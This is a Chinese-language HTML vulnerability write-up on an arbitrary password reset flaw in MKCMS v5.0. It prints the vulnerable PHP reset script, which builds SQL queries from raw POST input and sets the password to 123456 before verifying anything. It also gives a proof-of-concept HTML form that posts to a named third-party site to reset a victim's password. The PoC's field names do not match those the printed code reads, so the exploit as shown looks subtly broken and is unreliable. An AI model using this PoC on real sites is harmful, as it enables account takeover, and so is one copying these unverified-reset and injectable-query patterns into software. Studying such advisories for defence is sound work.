<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.csD1E291E2{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="mkcms-v50-任意密码重置漏洞"><span class="csDE05BCC">MKCMS v5.0 </span><span class="csECDA2D3">任意密码重置漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">MKCMS v5.0</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">漏洞出现在</span><span class="cs9FB05234">/ucenter/repass.php</span><span class="cs9C1B1871">第</span><span class="cs8926E06">1-44</span><span class="cs9C1B1871">行</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;?php </span><span class="cs8926E06"><br/></span><span class="cs9FB05234">include(&#39;../system/inc.php&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if(isset($_SESSION[&#39;user_name&#39;])){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">header(&#39;location:index.php&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">};</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">if(isset($_POST[&#39;submit&#39;])){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$username = stripslashes(trim($_POST[&#39;name&#39;]));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$email = trim($_POST[&#39;email&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">// </span><span class="cs7FFD2630">检测用户名是否存在</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$query = mysql_query(&quot;select u_id from mkcms_user where u_name=&#39;$username&#39; and u_email=&#39;$email&#39;&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if(!! $row = mysql_fetch_array($query)){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$_data[&#39;u_password&#39;] = md5(123456);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">$sql = &#39;update mkcms_user set &#39;.arrtoupdate($_data).&#39; where u_name=&quot;&#39;.$username.&#39;&quot;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if (mysql_query($sql)) {</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">$token =$row[&#39;u_question&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">include(&quot;emailconfig.php&quot;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;//</span><span class="cs7FFD2630">创建</span><span class="cs9FB05234">$smtp</span><span class="cs7FFD2630">对象</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">这里面的一个</span><span class="cs9FB05234">true</span><span class="cs7FFD2630">是表示使用身份验证</span><span class="cs9FB05234">,</span><span class="cs7FFD2630">否则不使用身份验证</span><span class="cs9FB05234">.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$smtp = new Smtp($MailServer, $MailPort, $smtpuser, $smtppass, true); </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$smtp-&gt;debug = false; </span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$mailType = &quot;HTML&quot;; //</span><span class="cs7FFD2630">信件类型，文本</span><span class="cs9FB05234">:text</span><span class="cs7FFD2630">；网页：</span><span class="cs9FB05234">HTML</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$email = $email; &nbsp;//</span><span class="cs7FFD2630">收件人邮箱</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$emailTitle = &quot;&quot;.$mkcms_name.&quot;</span><span class="cs7FFD2630">用户找回密码</span><span class="cs9FB05234">&quot;; //</span><span class="cs7FFD2630">邮件主题</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$emailBody = &quot;</span><span class="cs7FFD2630">亲爱的</span><span class="cs9FB05234">&quot;.$username.&quot;</span><span class="cs7FFD2630">：</span><span class="cs9FB05234">&lt;br/&gt;</span><span class="cs7FFD2630">感谢您在我站注册帐号。</span><span class="cs9FB05234">&lt;br/&gt;</span><span class="cs7FFD2630">您的初始密码为</span><span class="cs9FB05234">123456&lt;br/&gt;</span><span class="cs7FFD2630">如果此次找回密码请求非你本人所发，请忽略本邮件。</span><span class="cs9FB05234">&lt;br/&gt;&lt;p style=&#39;text-align:right&#39;&gt;-------- &quot;.$mkcms_name.&quot; </span><span class="cs7FFD2630">敬上</span><span class="cs9FB05234">&lt;/p&gt;&quot;;</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// sendmail</span><span class="cs7FFD2630">方法</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">参数</span><span class="cs9FB05234">1</span><span class="cs7FFD2630">是收件人邮箱</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">参数</span><span class="cs9FB05234">2</span><span class="cs7FFD2630">是发件人邮箱</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">参数</span><span class="cs9FB05234">3</span><span class="cs7FFD2630">是主题（标题）</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">参数</span><span class="cs9FB05234">4</span><span class="cs7FFD2630">是邮件主题（标题）</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">参数</span><span class="cs9FB05234">4</span><span class="cs7FFD2630">是邮件内容</span><span class="cs9FB05234"> &nbsp;</span><span class="cs7FFD2630">参数是内容类型文本</span><span class="cs9FB05234">:text </span><span class="cs7FFD2630">网页</span><span class="cs9FB05234">:HTML</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$rs = $smtp-&gt;sendmail($email, $smtpMail, $emailTitle, $emailBody, $mailType);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">if($rs==true){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &#39;&lt;script&gt;alert(&quot;</span><span class="cs7FFD2630">请登录到您的邮箱查看您的密码！</span><span class="cs9FB05234">&quot;);window.history.go(-1);&lt;/script&gt;&#39;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}else{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">echo &quot;</span><span class="cs7FFD2630">找回密码失败</span><span class="cs9FB05234">&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">?&gt;</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">本质上来说此处是一个逻辑问题，程序未通过邮箱等验证是否为用户本身就直接先在第</span><span class="cs8926E06">13-14</span><span class="cs9C1B1871">行把用户密码重置为</span><span class="cs9FB05234">123456</span><span class="cs9C1B1871">了，根本没管邮件发送成功没有。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/MKCMS/MKCMS%20v5.0%20%e4%bb%bb%e6%84%8f%e5%af%86%e7%a0%81%e9%87%8d%e7%bd%ae%e6%bc%8f%e6%b4%9e_files/image0.jpg" width="560" height="441" alt="" style="border-width:0px;" /></span></p><h3 class="cs868C439D">
			<a name="poc"><span class="csD1E291E2">poc</span></a></h3>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">构造如下</span><span class="cs8926E06">poc.html,</span><span class="cs9C1B1871">并访问</span><span class="cs8926E06">poc.html</span><span class="cs9C1B1871">，然后用</span><span class="cs8926E06">123456</span><span class="cs9C1B1871">密码登录即可</span></p><p class="cs3A447A38"><span class="cs9FB05234">&lt;html&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&lt;body&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&lt;script&gt;history.pushState(&#39;&#39;, &#39;&#39;, &#39;/&#39;)&lt;/script&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;form action=&quot;http://v.micool.top/ucenter/repass.php&quot; method=&quot;POST&quot;&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=&quot;hidden&quot; name=&quot;u&amp;#95;name&quot; value=&quot;lduo123&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=&quot;hidden&quot; name=&quot;u&amp;#95;email&quot; value=&quot;admin&amp;#64;gmail&amp;#46;com&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&lt;/form&gt; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&lt;/body&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">&lt;/html&gt;</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/4189#toc-1</span></p><p class="cs6FD73CFB"><span class="cs8926E06">https://cisk123456.blogspot.com/2019/04/mkcms-v50.html</span></p></body>
</html>
